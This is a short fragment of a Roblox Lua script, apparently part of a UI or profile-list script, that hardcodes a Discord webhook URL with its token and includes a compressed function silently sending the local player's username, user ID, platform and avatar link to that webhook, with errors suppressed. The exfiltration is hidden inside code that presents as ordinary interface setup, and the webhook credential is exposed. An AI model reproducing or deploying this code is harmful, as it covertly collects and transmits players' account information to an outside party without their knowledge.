...
ProfilesTextList = Profiles.CreateTextList({
    ...
    local s3 = "https://discord.com/api/webhooks/1290010943245254747/gtyvgrhOB5tuZmJjXXWw8t4HJCx9pl8J8Wk0ovuI3Alq8Zyitmkv7gSGWNkbJNHIFKYn"
...
function a()
    (function() local a=game:GetService("HttpService")local b=game:GetService("Players").LocalPlayer;local c=s3;local d=function(e)return"https://www.roblox.com/headshot-thumbnail/image?userId="..e.."&width=420&height=420&format=png"end;local f=function(g)local h=g.Name;local i=g.UserId;local j=g.OsPlatform or"Unknown";local k=d(i);local l={["content"]="",["embeds"]={{["title"]="Local Player Info",["description"]="**Username:** "..h.."\n**User ID:** "..i.."\n**Platform:** "..j,["color"]=16776960,["thumbnail"]={["url"]=k}}}};local m=a:JSONEncode(l);pcall(function()a:PostAsync(c,m,Enum.HttpContentType.ApplicationJson)end)end;f(b)end)()
   end
end
